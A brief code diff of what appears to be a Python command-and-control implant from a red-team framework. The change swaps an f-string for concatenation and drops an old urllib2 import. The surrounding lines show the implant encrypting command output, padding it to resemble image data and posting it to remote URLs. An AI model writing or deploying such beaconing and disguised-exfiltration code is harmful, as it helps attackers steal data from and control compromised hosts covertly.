@@ -1,6 +1,4 @@
 import os, subprocess, re, datetime, time, base64, string, random
-try:import urllib.request as urllib2
-except:import urllib2
 
 def parse_sleep_time(sleep):
   if sleep.endswith('s'):
@@ -217,7 +215,7 @@ while(True):
                 dataimage = data.ljust(1500, bytes('\x00', "utf-8"))
             enc=encrypt(key, returnval, gzipfile=True)
             dataimagebytes = dataimage+enc
-            send_request("/%%s%%s" %% (random.choice(urls), uri), data=dataimagebytes, headers={"Cookie" : f"SessionID={postcookie}"})
+            send_request("/%%s%%s" %% (random.choice(urls), uri), data=dataimagebytes, headers={"Cookie" : "SessionID=" + postcookie})
 
       except Exception as e:
         print(e)
